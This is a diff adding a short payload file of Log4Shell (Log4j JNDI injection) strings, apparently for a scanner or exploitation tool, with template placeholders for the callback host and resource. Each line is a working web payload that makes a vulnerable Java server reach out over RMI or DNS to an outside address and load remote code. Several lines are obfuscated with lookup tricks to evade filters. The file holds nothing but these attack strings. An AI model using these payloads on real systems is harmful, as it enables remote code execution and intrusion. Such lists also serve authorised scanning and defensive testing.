@@ -1,0 +1,8 @@
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{ .CADDR }}/{{ .Resource }}}
+${${::-j}ndi:rmi://{{ .CADDR }}/{{ .Resource }}}
+${jndi:rmi://{{ .CADDR }}}
+${${lower:jndi}:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
+${${lower:${lower:jndi}}:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{ .CADDR }}/{{ .Resource }}}
+${jndi:dns://{{ .CADDR }}}
